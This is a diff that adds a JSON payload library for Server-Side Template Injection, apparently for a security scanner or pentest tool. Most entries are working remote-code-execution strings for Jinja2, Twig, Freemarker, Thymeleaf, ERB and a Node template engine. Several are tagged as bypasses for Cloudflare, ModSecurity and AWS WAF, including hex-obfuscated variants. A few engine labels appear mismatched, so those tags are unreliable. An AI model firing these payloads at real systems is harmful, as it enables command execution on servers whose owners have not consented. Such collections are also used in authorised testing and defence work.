@@ -1,0 +1,204 @@
+{
+    "vulnerability_type": "SSTI",
+    "description": "Server-Side Template Injection payloads with WAF bypass variants",
+    "payloads": [
+        {
+            "payload": "{{7*7}}",
+            "description": "Basic SSTI detection (Jinja2/Twig)",
+            "context": "template_input",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "detection",
+                "jinja2",
+                "twig"
+            ]
+        },
+        {
+            "payload": "${7*7}",
+            "description": "Basic SSTI detection (Freemarker/Thymeleaf)",
+            "context": "template_input",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "detection",
+                "freemarker"
+            ]
+        },
+        {
+            "payload": "#{7*7}",
+            "description": "Basic SSTI detection (Ruby ERB)",
+            "context": "template_input",
+            "waf_bypass": false,
+            "tags": [
+                "basic",
+                "detection",
+                "erb"
+            ]
+        },
+        {
+            "payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+            "description": "Jinja2 RCE via config object",
+            "context": "template_input",
+            "waf_bypass": false,
+            "tags": [
+                "jinja2",
+                "rce",
+                "config"
+            ]
+        },
+        {
+            "payload": "{{''.__class__.__mro__[1].__subclasses__()}}",
+            "description": "Jinja2 class enumeration",
+            "context": "template_input",
+            "waf_bypass": false,
+            "tags": [
+                "jinja2",
+                "class_enum"
+            ]
+        },
+        {
+            "payload": "{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}",
+            "description": "Jinja2 RCE via subclass iteration",
+            "context": "template_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity"
+            ],
+            "tags": [
+                "jinja2",
+                "rce",
+                "subclass",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}",
+            "description": "Jinja2 RCE with hex-encoded underscores and attr filter",
+            "context": "template_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity",
+                "aws_waf"
+            ],
+            "tags": [
+                "jinja2",
+                "rce",
+                "hex_encode",
+                "attr_filter",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "{{lipsum.__globals__.os.popen('id').read()}}",
+            "description": "Jinja2 RCE via lipsum global",
+            "context": "template_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity"
+            ],
+            "tags": [
+                "jinja2",
+                "rce",
+                "lipsum",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+            "description": "Jinja2 RCE via cycler object",
+            "context": "template_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "aws_waf"
+            ],
+            "tags": [
+                "jinja2",
+                "rce",
+                "cycler",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "<%= system('id') %>",
+            "description": "Ruby ERB command execution",
+            "context": "template_input",
+            "waf_bypass": false,
+            "tags": [
+                "erb",
+                "ruby",
+                "rce"
+            ]
+        },
+        {
+            "payload": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+            "description": "Freemarker RCE via Execute class",
+            "context": "template_input",
+            "waf_bypass": false,
+            "tags": [
+                "freemarker",
+                "rce"
+            ]
+        },
+        {
+            "payload": "*{T(java.lang.Runtime).getRuntime().exec('id')}",
+            "description": "Thymeleaf/Spring EL RCE",
+            "context": "template_input",
+            "waf_bypass": false,
+            "tags": [
+                "thymeleaf",
+                "spring",
+                "rce"
+            ]
+        },
+        {
+            "payload": "{{['id']|filter('system')}}",
+            "description": "Twig RCE via filter",
+            "context": "template_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare",
+                "modsecurity"
+            ],
+            "tags": [
+                "twig",
+                "rce",
+                "filter",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
+            "description": "Twig RCE via registerUndefinedFilterCallback",
+            "context": "template_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "modsecurity"
+            ],
+            "tags": [
+                "twig",
+                "rce",
+                "callback",
+                "waf_bypass"
+            ]
+        },
+        {
+            "payload": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}",
+            "description": "Pug/Jade RCE",
+            "context": "template_input",
+            "waf_bypass": true,
+            "bypass_target": [
+                "cloudflare"
+            ],
+            "tags": [
+                "pug",
+                "jade",
+                "rce",
+                "waf_bypass"
+            ]
+        }
+    ]
+}
